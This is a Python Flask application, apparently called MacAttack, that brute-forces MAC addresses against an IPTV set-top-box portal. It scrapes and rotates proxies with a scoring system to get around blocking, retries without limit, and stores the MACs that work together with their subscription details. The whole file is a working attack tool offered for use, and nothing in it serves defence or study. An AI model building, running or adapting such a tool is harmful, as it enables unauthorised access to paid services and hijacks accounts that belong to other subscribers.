import os
import json
import threading
import asyncio
import secrets
import re
import logging
from datetime import datetime
from functools import wraps
from collections import deque
from flask import Flask, render_template, request, jsonify, Response, session
import requests

# Importiere den neuen Async-Client aus der stb.py
import stb 

# --- KONFIGURATION ---
# Wir nutzen Port 5003, da dein docker-compose diesen Port nach außen gibt
PORT = 5003
CONFIG_FILE = os.getenv("CONFIG", "/app/data/macattack.json")

app = Flask(__name__)
app.secret_key = secrets.token_urlsafe(32)

# Globaler Status für das Web-UI
SCAN_STATE = {
    "running": False,
    "total": 0,
    "checked": 0,
    "hits": 0,
    "errors": 0,
    "active_proxies": 0,
    "status_msg": "Bereit"
}

def load_config():
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, 'r') as f:
                conf = json.load(f)
                # Sicherstellen, dass die Original-Keys existieren
                for key in ["proxy_sources", "proxies", "found_macs", "portals", "mac_lists"]:
                    if key not in conf: conf[key] = []
                if "settings" not in conf: 
                    conf["settings"] = {"auth_enabled": False, "unlimited_retries": True}
                return conf
        except: pass
    return {"portals": [], "proxies": [], "found_macs": [], "proxy_sources": [], "mac_lists": [], "settings": {}}

def save_config(conf):
    os.makedirs(os.path.dirname(CONFIG_FILE), exist_ok=True)
    with open(CONFIG_FILE, 'w') as f:
        json.dump(conf, f, indent=4)

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        conf = load_config()
        if conf.get("settings", {}).get("auth_enabled") and not session.get("logged_in"):
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

# --- PROXY LOGIK (FETCH & SOURCES) ---

@app.route('/api/proxies/sources', methods=['GET', 'POST', 'DELETE'])
@requires_auth
def api_proxy_sources():
    conf = load_config()
    if request.method == 'POST':
        conf['proxy_sources'] = request.json.get('sources', [])
        save_config(conf)
        return jsonify({"success": True})
    elif request.method == 'DELETE':
        conf['proxy_sources'] = []
        save_config(conf)
        return jsonify({"success": True})
    return jsonify(conf.get('proxy_sources', []))

@app.route('/api/proxies/fetch', methods=['POST'])
@requires_auth
def api_proxies_fetch():
    conf = load_config()
    sources = conf.get('proxy_sources', [])
    new_proxies = set()
    # Original Regex für IP:Port
    proxy_re = re.compile(r'\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{2,5}\b')
    
    for url in sources:
        try:
            resp = requests.get(url, timeout=10, headers={'User-Agent': 'Mozilla/5.0'})
            if resp.status_code == 200:
                matches = proxy_re.findall(resp.text)
                for m in matches: new_proxies.add(m)
        except: continue
    
    current = set(conf.get('proxies', []))
    combined = list(current.union(new_proxies))
    conf['proxies'] = combined
    save_config(conf)
    return jsonify({"success": True, "count": len(new_proxies), "total": len(combined)})

@app.route('/api/proxies/test', methods=['POST'])
@requires_auth
def api_proxies_test():
    """Der Scanner übernimmt das Testen automatisch via Scoring."""
    return jsonify({"success": True, "message": "Proxies werden beim Start der Attacke validiert."})

# --- SCANNER ENGINE (ASYNC) ---

class AsyncScanner:
    def __init__(self, macs, portal, proxies, threads, skip_unl, unl_retries):
        self.macs = macs
        self.portal = portal
        # Scoring-System: Jeder Proxy startet mit 10 Punkten
        self.proxies = deque([{'url': p, 'score': 10} for p in proxies])
        self.threads = threads
        self.skip_unl = skip_unl
        self.unl_retries = unl_retries
        self.queue = asyncio.Queue()
        self.retry_counts = {}
        self.client = stb.AsyncStbClient() # Nutzt die neue stb.py

    async def worker(self):
        while SCAN_STATE['running']:
            try:
                item = await asyncio.wait_for(self.queue.get(), timeout=1.0)
            except: continue
            
            if not self.proxies: break
            p_obj = self.proxies.popleft()
            
            try:
                # Auto-Detect & Handshake in einem Rutsch
                success, data = await self.client.quick_scan(self.portal, item['mac'], p_obj['url'])
                SCAN_STATE['checked'] += 1
                
                if success:
                    p_obj['score'] = min(p_obj['score'] + 1, 20)
                    if not (self.skip_unl and 'unlimited' in str(data['expiry']).lower()):
                        data = await self.client.fetch_details(data, p_obj['url'])
                    
                    data['found_at'] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    SCAN_STATE['hits'] += 1
                    conf = load_config()
                    conf['found_macs'].append(data)
                    save_config(conf)
                
                self.proxies.append(p_obj)
            except:
                p_obj['score'] -= 1
                if p_obj['score'] > 0: self.proxies.append(p_obj)
                
                # Retry Logik
                retries = self.retry_counts.get(item['mac'], 0)
                if self.unl_retries or retries < 5:
                    self.retry_counts[item['mac']] = retries + 1
                    await self.queue.put(item)
                else: SCAN_STATE['errors'] += 1
            finally:
                self.queue.task_done()
                SCAN_STATE['active_proxies'] = len(self.proxies)

    async def run(self):
        for m in self.macs: await self.queue.put({'mac': m})
        workers = [asyncio.create_task(self.worker()) for _ in range(min(self.threads, 200))]
        await self.queue.join()
        await self.client.close()
        SCAN_STATE['running'] = False

# --- API ROUTEN ---

@app.route('/')
def index():
    return render_template('index.html', version="3.1-Async")

@app.route('/api/attack/start', methods=['POST'])
@requires_auth
def api_start():
    data = request.json
    conf = load_config()
    
    macs_to_scan = data.get('macs', [])
    portal_url = data.get('portal', '')
    proxy_list = data.get('proxies', []) or conf.get('proxies', [])
    
    if not macs_to_scan or not portal_url:
        return jsonify({"success": False, "error": "Fehlende MACs oder Portal URL"})

    SCAN_STATE.update({"running": True, "total": len(macs_to_scan), "checked": 0, "hits": 0, "errors": 0})
    
    def run_loop():
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        scanner = AsyncScanner(
            macs_to_scan, portal_url, proxy_list,
            int(data.get('threads', 50)),
            data.get('skip_unlimited', False),
            conf['settings'].get('unlimited_retries', True)
        )
        loop.run_until_complete(scanner.run())
    
    threading.Thread(target=run_loop, daemon=True).start()
    return jsonify({"success": True})

@app.route('/api/attack/status')
def api_status(): return jsonify(SCAN_STATE)

@app.route('/api/attack/stop', methods=['POST'])
def api_stop():
    SCAN_STATE['running'] = False
    return jsonify({"success": True})

@app.route('/api/proxies', methods=['GET', 'POST', 'DELETE'])
@requires_auth
def api_proxies():
    conf = load_config()
    if request.method == 'POST':
        new_p = request.json.get('proxies', [])
        conf['proxies'] = list(set(conf.get('proxies', []) + new_p))
        save_config(conf)
    elif request.method == 'DELETE':
        conf['proxies'] = []; save_config(conf)
    return jsonify(conf.get('proxies', []))

@app.route('/api/found', methods=['GET', 'DELETE'])
@requires_auth
def api_found():
    conf = load_config()
    if request.method == 'DELETE':
        conf['found_macs'] = []; save_config(conf)
        return jsonify({"success": True})
    return jsonify(conf.get('found_macs', []))

@app.route('/api/settings', methods=['GET', 'POST'])
@requires_auth
def api_settings():
    conf = load_config()
    if request.method == 'POST':
        conf['settings'].update(request.json)
        save_config(conf)
        return jsonify({"success": True})
    return jsonify(conf.get('settings', {}))

if __name__ == "__main__":
    # Wir nutzen Port 5003 passend zur docker-compose.yml
    app.run(host="0.0.0.0", port=PORT)
